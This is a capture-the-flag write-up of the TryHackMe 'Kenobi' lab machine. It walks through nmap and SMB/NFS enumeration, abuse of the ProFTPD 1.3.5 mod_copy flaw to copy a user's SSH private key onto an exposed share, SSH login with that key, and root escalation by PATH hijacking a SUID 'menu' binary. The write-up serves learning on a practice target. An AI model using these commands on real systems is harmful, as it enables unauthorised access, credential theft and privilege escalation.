# **[Kenobi](https://tryhackme.com/room/kenobi)**

<br />

> Evan Diamantidis | June 20th, 2022

<br />

# Table of contents

### [1. Initial scan and enumeration](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Kenobi#1-initial-scan-and-enumeration-1)

### [2. Samba enumeration](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Kenobi#2-samba-enumeration-1)

### [3. Exploiting ProFTPD](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Kenobi#3-exploiting-proftpd-1)

### [4. Privilege escalation](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Machines/Kenobi#4-privilege-escalation-1)


<br />
<br />

## 1. Initial scan and enumeration

<br />

We kick things off using `nmap` to get some information on the open ports and services running on the target machine.

```
# Nmap 7.92 scan initiated Mon Jun 20 12:05:19 2022 as: nmap -sC -sV -oN nmap/initial 10.10.15.240
Nmap scan report for 10.10.15.240
Host is up (0.014s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      40738/udp   mountd
|   100005  1,2,3      41367/tcp6  mountd
|   100005  1,2,3      42593/tcp   mountd
|   100005  1,2,3      55768/udp6  mountd
|   100021  1,3,4      33961/tcp   nlockmgr
|   100021  1,3,4      45711/tcp6  nlockmgr
|   100021  1,3,4      49646/udp   nlockmgr
|   100021  1,3,4      54424/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2022-06-20T11:05:33
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-06-20T06:05:33-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 20 12:05:33 2022 -- 1 IP address (1 host up) scanned in 13.33 seconds
```

<br />

Here is the information we gathered:

- 21/tcp | ftp - `ProFTPD 1.3.5`

- 22/tcp | ssh - `OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)`

- 80/tcp | http - `Apache httpd 2.4.18 ((Ubuntu))`

- 111/tcp | rpcbind - `2-4 (RPC #100000)`

- 139/tcp | netbios-ssn - `Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`

- 445/tcp | netbios-ssn - `Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)`

- 2049/tcp | nfs_acl - `2-3 (RPC #100227)`

<br />
<br />

## 2. Samba enumeration

<br />

Ports 139 and 445 are running `Samba` shares, also known as `smb`, however as noted on this task port 445 uses TCP and is therefore suitable for newer `smb` versions.

![image](https://user-images.githubusercontent.com/14150485/174592034-7b43f31a-fedf-4d8e-bce8-efb942828587.png)

<br />

Proceed to enumerate the `smb` shares on the target using the command provided on the task.

```
╭─root@kali ~/TryHackMe/Machines/Kenobi  
╰─➤  nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.15.240
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 12:31 IST
Nmap scan report for 10.10.15.240
Host is up (0.0077s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.15.240\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.15.240\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.15.240\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 2.68 seconds
```

<br />

Now that we have the name of a share we can connect to it and browse for any files that can help us get a foothold.

```
╭─root@kali ~/TryHackMe/Machines/Kenobi  
╰─➤  smbclient //10.10.15.240/anonymous
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

                9204224 blocks of size 1024. 6876564 blocks available
smb: \> get log.txt 
getting file \log.txt of size 12237 as log.txt (221.3 KiloBytes/sec) (average 221.3 KiloBytes/sec)
smb: \> exit
```

<br />

The file found on the share contains information about an SSH key created for a user called `kenobi`, along with some details on a `ProFTPD` server running on the machine, as we also know from our initial scan.

Before we proceed to take advantage of `ProFTPD`, let us first have a look at the network file share. Per the task notes, there is an `rpcbind` service running on port 111 which converts remote procedure call (RPC) program numbers into universal addresses. When an RPC service is started, it tells `rpcbind` the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system which can enumerate using `nmap` along with the relevant scripts.

```
─root@kali ~  
╰─➤  nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.15.240
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 12:47 IST
Nmap scan report for 10.10.15.240
Host is up (0.015s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2022-06-20T11:25:01  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1837068.0  6876560.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 0.78 seconds
```

<br />

This gives us useful information about a mounted network file share that we can leverage later on.

<br />
<br />

## 3. Exploiting ProFTPD

<br />

The `ProFTPD` version running on the target is exploitable - We can get a full list using `searchsploit` or checking for this information online on [Exploit Database](https://www.exploit-db.com/) for example.

For the purposes of this box we will be using the `mod_copy` module which allows attackers to copy files and directories anywhere on the server.

Based on the information obtained by enumerating this box, we have the location of the SSH key for `kenobi` that we can copy to the mounted network file share which we can also mount locally.

Let's connect to the `ProFTPD` service and start by copying the file to a folder on the `nfs`.

```
╭─root@kali ~  
╰─➤  nc 10.10.15.240 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.15.240]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
quit
221 Goodbye.
```

<br />

Having successfully copied the file to the mounted share we can proceed to mount it locally.

```
╭─root@kali ~/TryHackMe/Machines/Kenobi  
╰─➤  mkdir kenobiNFS
╭─root@kali ~/TryHackMe/Machines/Kenobi  
╰─➤  mount 10.10.15.240:/var kenobiNFS
```

<br />

The drive is now accessible, our next step should therefore be to get a copy of the SSH key that we can use to access the target.

```
╭─root@kali ~/TryHackMe/Machines/Kenobi  
╰─➤  cp kenobiNFS/tmp/id_rsa .
╭─root@kali ~/TryHackMe/Machines/Kenobi  
╰─➤  chmod 600 id_rsa
```

<br />

We are now ready to connect as `kenobi` and get the first flag.

```
╭─root@kali ~/TryHackMe/Machines/Kenobi  
╰─➤  ssh -i id_rsa kenobi@10.10.15.240
The authenticity of host '10.10.15.240 (10.10.15.240)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:48: [hashed name]
    ~/.ssh/known_hosts:50: [hashed name]
    ~/.ssh/known_hosts:51: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.15.240' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Sep  4  2019 .
drwxr-xr-x 3 root   root   4096 Sep  4  2019 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
-rw-r--r-- 1 kenobi kenobi 3771 Sep  4  2019 .bashrc
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .cache
-rw-r--r-- 1 kenobi kenobi  655 Sep  4  2019 .profile
drwxr-xr-x 2 kenobi kenobi 4096 Sep  4  2019 share
drwx------ 2 kenobi kenobi 4096 Sep  4  2019 .ssh
-rw-rw-r-- 1 kenobi kenobi   33 Sep  4  2019 user.txt
-rw------- 1 kenobi kenobi  642 Sep  4  2019 .viminfo
kenobi@kenobi:~$ cat user.txt 
d**********c*******************9
```

<br />
<br />

## 4. Privilege escalation

<br />

SUID files are common and can provide a privilege escalation attack vector when not configured properly. We can check for such files either by using the `find / -perm -u=s -type f 2>/dev/null` command provided on the task, or a more detailed list using `find / -perm /4000 -type f -exec ls -la {} \; 2>/dev/null`.

```
kenobi@kenobi:/tmp$ find / -perm /4000 -type f -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 94240 May  8  2019 /sbin/mount.nfs
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
```

<br />

There is a particular file on the list that is smaller in size compared to the other ones that we do not see very often. Follow the instructions to run the binary using the `strings` command.

```
kenobi@kenobi:/tmp$ strings /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
```

<br />

Looking at the results, this file apparently executes commands without using its full path, often a good indication that it might be vulnerable to path hijacking.

Let follow the steps outlined on the task to manipulate our path so we can gain root privileges on the target.

```
kenobi@kenobi:/$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh> curl
kenobi@kenobi:/tmp$ chmod 777 curl 
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```

<br />

Executing the file now and selecting the first option will escalate our privileges to root which we can use to read the contents of the `/root/root.txt` file.

```
kenobi@kenobi:/tmp$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# whoami
root
# cat /root/root.txt
177**********9**********2*****02
```

<br />

We just pwned Kenobi!

<br />
